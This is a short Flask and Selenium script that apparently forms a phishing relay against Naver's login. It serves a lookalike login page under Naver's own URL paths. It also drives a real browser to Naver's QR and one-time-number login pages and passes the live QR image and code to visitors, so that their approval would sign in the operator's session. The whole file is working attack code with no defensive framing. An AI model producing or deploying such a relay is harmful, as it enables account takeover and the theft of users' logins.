import chromedriver_autoinstaller
from flask import Flask, render_template, redirect, jsonify
from selenium import webdriver

app = Flask(__name__)

chromedriver = chromedriver_autoinstaller.install()
driver = webdriver.Chrome(chromedriver)

NAVER_LOGIN_URL = 'https://nid.naver.com/'
NAVER_LOGIN_FORMAT = ['https://nid.naver.com/nidlogin.login?mode=form', 'https://nid.naver.com/nidlogin.login?mode=number', 'https://nid.naver.com/nidlogin.login?mode=qrcode']

@app.route('/')
def index():
    return redirect('nidlogin.login')

@app.route('/nidlogin.login')
def nidlogin():
    driver.get(NAVER_LOGIN_URL)
    return render_template('Login.html')

@app.route('/loinid')
def loinid():
    driver.get(NAVER_LOGIN_FORMAT[0])
    json = {"Status":"Success"}
    return jsonify(json)

@app.route('/ones')
def ones():
    driver.get(NAVER_LOGIN_FORMAT[1])
    json = {"Status":"Success"}
    return jsonify(json)

@app.route('/qrcode')
def qrcode():
    driver.get(NAVER_LOGIN_FORMAT[2])
    number = driver.execute_script('''
    return document.getElementsByClassName('point')[0].innerText;
    ''')
    qrImage = driver.execute_script('''
    return window.qrImage.getAttribute('src');
    ''')
    json = {"Status":"Success", "number":number, "qrImage":qrImage}
    return jsonify(json)

@app.route('/<path:path>')
def static_file(path):
    return app.send_static_file(path)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, debug=False)